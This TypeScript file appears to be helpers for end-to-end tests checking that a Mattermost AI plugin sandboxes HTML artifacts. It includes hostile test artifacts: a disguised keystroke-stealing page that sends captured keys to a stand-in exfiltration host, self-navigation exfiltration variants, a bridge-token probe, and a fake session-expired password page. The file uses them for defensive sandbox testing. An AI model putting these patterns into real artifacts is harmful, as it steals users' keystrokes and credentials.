// Copyright (c) 2023-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

// Helpers for the HTML artifacts e2e spec: feature-flag toggling, a
// deterministic self-contained artifact document, and theme preferences.

import * as http from 'http';
import type {AddressInfo} from 'net';

import {expect, type FrameLocator, type Locator, type Page} from '@playwright/test';

import MattermostContainer from './mmcontainer';
import {MATTERMOST_AI_PLUGIN_ID, pluginAdminConfigApiFromClient} from './plugin-http';

/** Flips the top-level `enableHTMLArtifacts` plugin config field, preserving everything else. */
export async function setHTMLArtifactsEnabled(mattermost: MattermostContainer, enabled: boolean): Promise<void> {
    const adminClient = await mattermost.getAdminClient();
    const api = pluginAdminConfigApiFromClient(adminClient, mattermost.url(), MATTERMOST_AI_PLUGIN_ID);
    const current = await api.get();
    await api.put({...current, enableHTMLArtifacts: enabled}, {settleMs: 2000});
}

// Mattermost's built-in "Onyx" dark theme.
export const ONYX_THEME = {
    type: 'Onyx',
    sidebarBg: '#121317',
    sidebarText: '#ffffff',
    sidebarUnreadText: '#ffffff',
    sidebarTextHoverBg: '#25262a',
    sidebarTextActiveBorder: '#4a7ebb',
    sidebarTextActiveColor: '#ffffff',
    sidebarHeaderBg: '#121317',
    sidebarHeaderTextColor: '#ffffff',
    sidebarTeamBarBg: '#000000',
    onlineIndicator: '#3db887',
    awayIndicator: '#f5ab00',
    dndIndicator: '#d24b4e',
    mentionBg: '#1c58d9',
    mentionBj: '#1c58d9',
    mentionColor: '#ffffff',
    centerChannelBg: '#191b1f',
    centerChannelColor: '#e3e4e8',
    newMessageSeparator: '#1adbdb',
    linkColor: '#5d89ea',
    buttonBg: '#1c58d9',
    buttonColor: '#ffffff',
    errorTextColor: '#da6c6e',
    mentionHighlightBg: '#0d6e6e',
    mentionHighlightLink: '#a4f4f4',
    codeTheme: 'monokai',
};

/** Saves a user theme preference (all teams). Pass null to reset to the default (Denim). */
export async function setUserTheme(
    mattermost: MattermostContainer,
    username: string,
    password: string,
    theme: Record<string, string> | null,
): Promise<void> {
    const client = await mattermost.getClient(username, password);
    const me = await client.getMe();
    const pref = {user_id: me.id, category: 'theme', name: '', value: JSON.stringify(theme ?? {})};
    if (theme) {
        await client.savePreferences(me.id, [pref]);
    } else {
        await client.deletePreferences(me.id, [pref]);
    }
}

/**
 * The host page's artifact frame(s): the unsandboxed srcdoc wrapper whose CSP
 * only lets its child frame load the artifact. The artifact itself runs in a
 * sandboxed iframe inside it (see artifactContentIframe).
 */
export function artifactWrappers(scope: Page | Locator): Locator {
    return scope.locator('iframe[data-testid="html-artifact-wrapper"]');
}

/** The sandboxed iframe inside `wrapper` that loads the artifact document. */
export function artifactContentIframe(wrapper: Locator): Locator {
    return wrapper.contentFrame().locator('iframe[data-testid="html-artifact-content"]');
}

/** The artifact document inside `wrapper`. */
export function artifactFrame(wrapper: Locator): FrameLocator {
    return artifactContentIframe(wrapper).contentFrame();
}

/** Matches the artifact content route for one host load: `.../artifacts/<fileId>?n=<nonce>`. */
export const ARTIFACT_CONTENT_URL = /\/plugins\/mattermost-ai\/artifacts\/([a-z0-9]{26})\?n=([A-Za-z0-9_-]{22})$/;

/** Matches the bridge token route for one host load: `.../artifacts/<fileId>/token?n=<nonce>`. */
export const ARTIFACT_TOKEN_URL = /\/plugins\/mattermost-ai\/artifacts\/([a-z0-9]{26})\/token\?n=([A-Za-z0-9_-]{22})$/;

/** Clicks Run on the (first) artifact card in `scope`, which every viewer must do before it loads. */
export async function runArtifact(scope: Locator): Promise<void> {
    const card = scope.getByTestId('html-artifact-card').first();
    await card.getByTestId('html-artifact-run').click();
    await expect(card.getByTestId('html-artifact-run-placeholder')).toHaveCount(0);
}

/**
 * Clicks the host's interact overlay of the (first) artifact frame in `scope`
 * unless the viewer already engaged it. Until then the overlay takes every
 * click, so clicks meant for controls inside the artifact must come after.
 */
export async function engageArtifact(scope: Locator): Promise<void> {
    const frame = scope.getByTestId('html-artifact-frame').first();
    if ((await frame.getAttribute('data-engaged')) !== 'true') {
        await frame.getByTestId('html-artifact-interact').click();
    }
    await expect(frame).toHaveAttribute('data-engaged', 'true');
}

/** The host's interact overlay on the (first) artifact frame in `scope`, shown while the viewer has not engaged it. */
export function interactOverlay(scope: Locator): Locator {
    return scope.getByTestId('html-artifact-frame').first().getByTestId('html-artifact-interact');
}

/** Moves focus to the message box (the center channel's post textbox), which ends any artifact's engagement. */
export async function focusMessageBox(page: Page): Promise<Locator> {
    const textbox = page.getByTestId('post_textbox');
    await textbox.click();
    await expect(textbox).toBeFocused();
    return textbox;
}

export const SECOND_VIEWER_USERNAME = 'seconduser';
export const SECOND_VIEWER_PASSWORD = 'seconduser';

/** Creates seconduser on the test team (same onboarding prefs as regularuser, threads inline). */
export async function setupSecondViewer(mattermost: MattermostContainer): Promise<void> {
    await mattermost.createUser('seconduser@sample.com', SECOND_VIEWER_USERNAME, SECOND_VIEWER_PASSWORD);
    await mattermost.addUserToTeam(SECOND_VIEWER_USERNAME, 'test');
    const client = await mattermost.getClient(SECOND_VIEWER_USERNAME, SECOND_VIEWER_PASSWORD);
    const me = await client.getMe();
    await client.savePreferences(me.id, [
        {user_id: me.id, category: 'tutorial_step', name: me.id, value: '999'},
        {user_id: me.id, category: 'onboarding_task_list', name: 'onboarding_task_list_show', value: 'false'},
        {user_id: me.id, category: 'onboarding_task_list', name: 'onboarding_task_list_open', value: 'false'},
        {user_id: me.id, category: 'drafts', name: 'drafts_tour_tip_showed', value: JSON.stringify({drafts_tour_tip_showed: true})},
        {user_id: me.id, category: 'crt_thread_pane_step', name: me.id, value: '999'},
        {user_id: me.id, category: 'display_settings', name: 'collapsed_reply_threads', value: 'off'},
    ]);
}

export const FOCUS_THIEF_FILE_NAME = 'focus-thief.html';
export const FOCUS_THIEF_EXFIL = 'https://exfil.example.invalid/keys';

/**
 * An artifact that keeps calling focus() on its own off-screen input whenever
 * its frame does not have focus, to catch keystrokes meant for the message
 * box, and tries to send whatever it caught away by navigating its frame.
 */
export const FOCUS_THIEF_HTML = `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Quarterly dashboard</title></head>
<body>
<h1>Quarterly dashboard</h1>
<p>Revenue is up 12% quarter over quarter.</p>
<input id="keys" aria-label="notes" autocomplete="off" style="position:absolute;left:-9999px">
<script>
  var keys = document.getElementById('keys');
  setInterval(function () {
    if (!document.hasFocus() || document.activeElement !== keys) {
      keys.focus();
    }
  }, 300);
  keys.addEventListener('input', function () {
    if (keys.value.length >= 3) {
      location.href = '${FOCUS_THIEF_EXFIL}?k=' + encodeURIComponent(keys.value);
    }
  });
</script>
</body>
</html>
`;

export type ExternalServer = {
    url: string;

    /** Every request path the server has received. */
    requests: string[];
    close: () => Promise<void>;
};

/**
 * A real server outside Mattermost that records every request it receives,
 * for proving an artifact never reached it. Listens on the host the browser
 * reaches Mattermost on (loopback for localhost), so a navigation to it
 * stays within the same address space.
 */
export async function startExternalServer(mattermostURL: string): Promise<ExternalServer> {
    const mmHost = new URL(mattermostURL).hostname;
    const host = mmHost === 'localhost' ? '127.0.0.1' : mmHost;
    const requests: string[] = [];
    const server = http.createServer((req, res) => {
        requests.push(req.url ?? '');
        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store'});
        res.end('<!doctype html><html lang="en"><body><h1>Your Mattermost session expired</h1>' +
            '<p>Sign in again to keep viewing this report.</p><input type="password" aria-label="Password"></body></html>');
    });
    await new Promise<void>((resolve) => server.listen(0, host, resolve));
    const {port} = server.address() as AddressInfo;
    return {
        url: `http://${host}:${port}/session-expired`,
        requests,
        close: () => new Promise<void>((resolve) => {
            server.closeAllConnections();
            server.close(() => resolve());
        }),
    };
}

export const SPRINT_DASHBOARD_FILE_NAME = 'sprint-dashboard.html';

/**
 * A small, self-contained "Sprint dashboard": stat cards, an inline SVG bar
 * chart, tabs, a counter, a consent-gated greeting via
 * window.mattermost.getCurrentUser(), and a network probe that records whether
 * fetch() to the Mattermost API was blocked.
 */
export const SPRINT_DASHBOARD_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Sprint dashboard</title>
<style>
  :root {
    --bg: var(--mm-center-channel-bg, #ffffff);
    --fg: var(--mm-center-channel-color, #3f4350);
    --accent: var(--mm-button-bg, #1c58d9);
    --accent-fg: var(--mm-button-color, #ffffff);
    --link: var(--mm-link-color, #386fe5);
    --ok: var(--mm-online-indicator, #3db887);
    --warn: var(--mm-away-indicator, #f5ab00);
    --muted: color-mix(in srgb, var(--fg) 64%, transparent);
    --line: color-mix(in srgb, var(--fg) 14%, transparent);
    --tint: color-mix(in srgb, var(--fg) 4%, var(--bg));
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; background: var(--bg); color: var(--fg);
    font: 14px/1.45 "Open Sans", system-ui, -apple-system, "Segoe UI", sans-serif; }
  main { padding: 20px 22px 22px; }
  header { display: flex; align-items: baseline; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
  h1 { margin: 0; font-size: 18px; font-weight: 700; letter-spacing: -0.01em; }
  .sub { color: var(--muted); font-size: 12px; }
  .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(128px, 1fr)); gap: 10px; margin: 16px 0; }
  .card { background: var(--tint); border: 1px solid var(--line); border-radius: 8px; padding: 12px 14px; }
  .card .label { font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--muted); }
  .card .value { font-size: 22px; font-weight: 700; margin-top: 2px; font-variant-numeric: tabular-nums; }
  .card .delta { font-size: 12px; color: var(--ok); }
  .card .delta.warn { color: var(--warn); }
  .tabs { display: flex; gap: 4px; border-bottom: 1px solid var(--line); margin-bottom: 12px; }
  .tabs button { background: none; border: 0; border-bottom: 2px solid transparent; color: var(--muted);
    font: inherit; font-weight: 600; padding: 6px 10px; cursor: pointer; }
  .tabs button[aria-selected="true"] { color: var(--accent); border-bottom-color: var(--accent); }
  [role="tabpanel"][hidden] { display: none; }
  svg { display: block; width: 100%; height: auto; max-height: 170px; }
  svg text { fill: var(--muted); font-size: 11px; }
  .bar { fill: var(--accent); }
  .bar.goal { fill: color-mix(in srgb, var(--accent) 30%, transparent); }
  ul.list { margin: 0; padding: 0; list-style: none; }
  ul.list li { display: flex; justify-content: space-between; padding: 7px 0; border-bottom: 1px solid var(--line); }
  .pill { font-size: 11px; border-radius: 10px; padding: 1px 8px; background: var(--tint); border: 1px solid var(--line); }
  footer { display: flex; align-items: center; gap: 12px; margin-top: 16px; flex-wrap: wrap; }
  .btn { background: var(--accent); color: var(--accent-fg); border: 0; border-radius: 4px; padding: 8px 14px;
    font: inherit; font-weight: 600; cursor: pointer; }
  .btn.secondary { background: transparent; color: var(--accent); border: 1px solid var(--accent); }
  #greeting { font-weight: 600; color: var(--link); }
  /* The network probe is for the test only: kept in the DOM, visually hidden. */
  .visually-hidden { position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0; overflow: hidden;
    clip: rect(0 0 0 0); white-space: nowrap; border: 0; }
  /* Fullscreen-only content, driven by the display mode the host sets on <html>. */
  .fullscreen-only { display: none; }
  html[data-mm-display-mode="fullscreen"] .fullscreen-only { display: block; }
  html[data-mm-display-mode="fullscreen"] main { max-width: 1120px; margin: 0 auto; padding: 32px 32px 40px; }
  html[data-mm-display-mode="fullscreen"] svg { max-height: 240px; }
  .split { display: grid; grid-template-columns: 2fr 1fr; gap: 16px; margin-top: 20px; }
  .panel { background: var(--tint); border: 1px solid var(--line); border-radius: 8px; padding: 14px 16px; }
  .panel h2 { margin: 0 0 10px; font-size: 13px; text-transform: uppercase; letter-spacing: .06em; color: var(--muted); }
  .meter { height: 8px; border-radius: 4px; background: var(--line); overflow: hidden; margin: 4px 0 10px; }
  .meter span { display: block; height: 100%; background: var(--accent); }
  .row { display: flex; justify-content: space-between; font-size: 13px; }
</style>
</head>
<body>
<main>
  <header>
    <h1>Sprint 42 dashboard</h1>
    <span class="sub">Oct 1 – Oct 14 · Agents team</span>
  </header>

  <section class="cards" aria-label="Sprint stats">
    <div class="card"><div class="label">Completed</div><div class="value" data-testid="stat-completed">34</div><div class="delta">+6 vs last sprint</div></div>
    <div class="card"><div class="label">In progress</div><div class="value">9</div><div class="delta warn">3 at risk</div></div>
    <div class="card"><div class="label">Velocity</div><div class="value">41 pts</div><div class="delta">+12%</div></div>
    <div class="card"><div class="label">Bugs closed</div><div class="value">17</div><div class="delta">+4</div></div>
  </section>

  <nav class="tabs" role="tablist">
    <button role="tab" id="tab-burndown" aria-selected="true" aria-controls="panel-burndown">Throughput</button>
    <button role="tab" id="tab-team" aria-selected="false" aria-controls="panel-team">Team</button>
  </nav>

  <section role="tabpanel" id="panel-burndown" aria-labelledby="tab-burndown">
    <svg viewBox="0 0 560 150" role="img" aria-label="Points completed per day">
      <g id="bars"></g>
    </svg>
  </section>
  <section role="tabpanel" id="panel-team" aria-labelledby="tab-team" hidden>
    <ul class="list">
      <li><span>Server: artifact route</span><span class="pill">Done</span></li>
      <li><span>Webapp: inline card</span><span class="pill">Review</span></li>
      <li><span>Consent broker</span><span class="pill">In progress</span></li>
    </ul>
  </section>

  <footer>
    <button class="btn" id="greet">Say hello</button>
    <button class="btn secondary" id="kudos">Kudos <span id="kudos-count">0</span></button>
    <span id="greeting" aria-live="polite"></span>
    <span id="net-result" class="visually-hidden" data-testid="net-result">network: pending</span>
  </footer>

  <section class="fullscreen-only" data-testid="fullscreen-details" aria-label="Sprint details">
    <div class="split">
      <div class="panel">
        <h2>Highlights</h2>
        <ul class="list">
          <li><span>HTML artifacts render inline and fullscreen</span><span class="pill">Shipped</span></li>
          <li><span>Consent-gated profile access</span><span class="pill">Shipped</span></li>
          <li><span>Theme follows the viewer</span><span class="pill">Shipped</span></li>
          <li><span>Load test on artifact route</span><span class="pill">Next sprint</span></li>
        </ul>
      </div>
      <div class="panel">
        <h2>Goal progress</h2>
        <div class="row"><span>Scope delivered</span><span>79%</span></div>
        <div class="meter"><span style="width: 79%"></span></div>
        <div class="row"><span>Bug budget used</span><span>42%</span></div>
        <div class="meter"><span style="width: 42%"></span></div>
        <div class="row"><span>Review turnaround</span><span>1.4 d</span></div>
        <div class="meter"><span style="width: 64%"></span></div>
      </div>
    </div>
  </section>
</main>
<script>
  (function () {
    var data = [3, 5, 4, 7, 6, 8, 5, 9, 7, 10];
    var g = document.getElementById('bars');
    var ns = 'http://www.w3.org/2000/svg';
    var max = 10, w = 40, gap = 14, h = 110;
    data.forEach(function (v, i) {
      var x = 20 + i * (w + gap);
      var goal = document.createElementNS(ns, 'rect');
      goal.setAttribute('class', 'bar goal');
      goal.setAttribute('x', x); goal.setAttribute('y', 10); goal.setAttribute('width', w);
      goal.setAttribute('height', h); goal.setAttribute('rx', 4);
      g.appendChild(goal);
      var bh = Math.round((v / max) * h);
      var bar = document.createElementNS(ns, 'rect');
      bar.setAttribute('class', 'bar');
      bar.setAttribute('x', x); bar.setAttribute('y', 10 + h - bh); bar.setAttribute('width', w);
      bar.setAttribute('height', bh); bar.setAttribute('rx', 4);
      g.appendChild(bar);
      var t = document.createElementNS(ns, 'text');
      t.setAttribute('x', x + w / 2); t.setAttribute('y', 140); t.setAttribute('text-anchor', 'middle');
      t.textContent = 'D' + (i + 1);
      g.appendChild(t);
    });

    var tabs = document.querySelectorAll('[role="tab"]');
    tabs.forEach(function (tab) {
      tab.addEventListener('click', function () {
        tabs.forEach(function (t) {
          var on = t === tab;
          t.setAttribute('aria-selected', on ? 'true' : 'false');
          document.getElementById(t.getAttribute('aria-controls')).hidden = !on;
        });
      });
    });

    var kudos = 0;
    document.getElementById('kudos').addEventListener('click', function () {
      kudos += 1;
      document.getElementById('kudos-count').textContent = String(kudos);
    });

    var greeting = document.getElementById('greeting');
    document.getElementById('greet').addEventListener('click', async function () {
      try {
        var user = await window.mattermost.getCurrentUser();
        greeting.textContent = 'Hello, ' + (user.displayName || user.username) + '!';
      } catch (err) {
        greeting.textContent = 'No profile access (' + ((err && err.code) || 'error') + ')';
      }
    });

    var net = document.getElementById('net-result');
    fetch('/api/v4/users/me', {credentials: 'include'})
      .then(function (r) { return r.text().then(function (body) { net.textContent = 'network: LEAKED ' + r.status + ' ' + body.slice(0, 40); }); })
      .catch(function (e) { net.textContent = 'network: blocked (' + (e && e.name) + ')'; });
  })();
</script>
</body>
</html>
`;

export const EXFIL_HOST = 'exfil.example.invalid';
export const EXFIL_URL = `https://${EXFIL_HOST}/?d=secret`;

/** Ways an artifact can navigate its own frame to carry data away in the URL. */
export type SelfNavigationKind = 'location.href' | 'meta refresh' | 'location.replace before load' | 'link click';

/** An artifact that renders a heading and navigates its own frame to `target` the given way. */
export function selfNavigationHTML(kind: SelfNavigationKind, target: string): string {
    const head = kind === 'meta refresh' ? `<meta http-equiv="refresh" content="1;url=${target}">` : '';
    let body = '';
    switch (kind) {
    case 'location.href':
        body = `<script>
  window.addEventListener('load', function () {
    setTimeout(function () { location.href = '${target}'; }, 500);
  });
</script>`;
        break;
    case 'location.replace before load':
        body = `<script>location.replace('${target}');</script>`;
        break;
    case 'link click':
        body = `<a id="go" href="${target}">Open report</a>
<script>
  window.addEventListener('load', function () {
    setTimeout(function () { document.getElementById('go').click(); }, 500);
  });
</script>`;
        break;
    }
    return `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Navigator</title>${head}</head>
<body>
<h1>Navigating artifact</h1>
${body}
</body>
</html>
`;
}

export const TOKEN_PROBE_FILE_NAME = 'token-probe.html';

/**
 * A genuine artifact that tries to get at the bridge token: its first script
 * shadows window.parent with a recorder, and after load it dumps the whole
 * document source (including every script text) into hidden elements.
 */
export const TOKEN_PROBE_HTML = `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Token probe</title>
<script>
  window.__recorded = [];
  window.parent = {postMessage: function (m) { window.__recorded.push(m); }};
</script>
</head>
<body>
<h1>Token probe</h1>
<pre id="recorded" data-testid="probe-recorded" hidden></pre>
<pre id="dom" data-testid="probe-dom" hidden></pre>
<script>
  window.addEventListener('load', function () {
    window.parent.postMessage({probe: 1});
    setTimeout(function () {
      var scripts = Array.prototype.map.call(document.querySelectorAll('script'), function (s) { return s.textContent; });
      document.getElementById('dom').textContent = document.documentElement.outerHTML + '\\n' + scripts.join('\\n');
      document.getElementById('recorded').textContent = JSON.stringify(window.__recorded);
    }, 300);
  });
</script>
</body>
</html>
`;

export const STANDUP_NOTES_FILE_NAME = 'standup-notes.html';

/**
 * A keyboard-driven artifact: whatever the viewer types while it has focus
 * shows in the draft line, and Enter adds the draft as a note.
 */
export const STANDUP_NOTES_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Standup notes</title>
<style>
  :root {
    --bg: var(--mm-center-channel-bg, #ffffff);
    --fg: var(--mm-center-channel-color, #3f4350);
    --accent: var(--mm-button-bg, #1c58d9);
    --muted: color-mix(in srgb, var(--fg) 64%, transparent);
    --line: color-mix(in srgb, var(--fg) 14%, transparent);
    --tint: color-mix(in srgb, var(--fg) 4%, var(--bg));
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; background: var(--bg); color: var(--fg);
    font: 14px/1.45 "Open Sans", system-ui, -apple-system, "Segoe UI", sans-serif; }
  main { padding: 20px 22px 22px; }
  h1 { margin: 0 0 4px; font-size: 18px; font-weight: 700; }
  .sub { color: var(--muted); font-size: 12px; }
  .draft { display: flex; align-items: center; gap: 8px; margin: 16px 0 12px; padding: 10px 12px;
    border: 1px solid var(--line); border-radius: 8px; background: var(--tint); min-height: 44px; }
  .draft .label { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .06em; }
  #typed { font-weight: 600; white-space: pre; }
  #typed::after { content: ""; display: inline-block; width: 2px; height: 1.1em; margin-left: 1px;
    vertical-align: text-bottom; background: var(--accent); animation: blink 1s steps(1) infinite; }
  @keyframes blink { 50% { opacity: 0; } }
  ul { margin: 0; padding: 0; list-style: none; }
  li { display: flex; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--line); }
  li::before { content: "\\2022"; color: var(--accent); font-weight: 700; }
</style>
</head>
<body>
<main>
  <h1>Standup notes</h1>
  <div class="sub">Type a note, press Enter to add it.</div>
  <div class="draft"><span class="label">Draft</span><span id="typed" data-testid="typed"></span></div>
  <ul id="notes" data-testid="notes">
    <li>Artifact cards render inline and fullscreen</li>
    <li>Consent prompt reviewed with design</li>
  </ul>
</main>
<script>
  var typed = document.getElementById('typed');
  var notes = document.getElementById('notes');
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Enter' && typed.textContent) {
      var li = document.createElement('li');
      li.textContent = typed.textContent;
      notes.appendChild(li);
      typed.textContent = '';
    } else if (e.key === 'Backspace') {
      typed.textContent = typed.textContent.slice(0, -1);
    } else if (e.key.length === 1) {
      typed.textContent += e.key;
    }
  });
</script>
</body>
</html>
`;
